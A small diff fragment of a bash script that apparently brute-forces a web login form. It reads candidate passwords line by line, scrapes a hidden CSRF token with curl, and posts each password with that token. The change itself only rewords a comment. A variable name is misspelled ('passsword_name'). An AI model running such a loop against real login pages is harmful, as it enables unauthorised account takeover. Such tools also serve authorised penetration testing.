@@ -43,7 +43,7 @@ while read line
 do
 	passwd=$line
 
-	# Change this line to get token
+	# If needed, change this line to parse the token value
 	token=$(curl -s -c cookies.txt "${form_page}" | grep hidden | grep "${token_name}" | grep -Pio 'value="\K[^"]*')
 
 	output=$(curl -s -b cookies.txt "${form_page}" --data-raw "${passsword_name}=${passwd}&${token_name}=${token}&${other_post_data}")
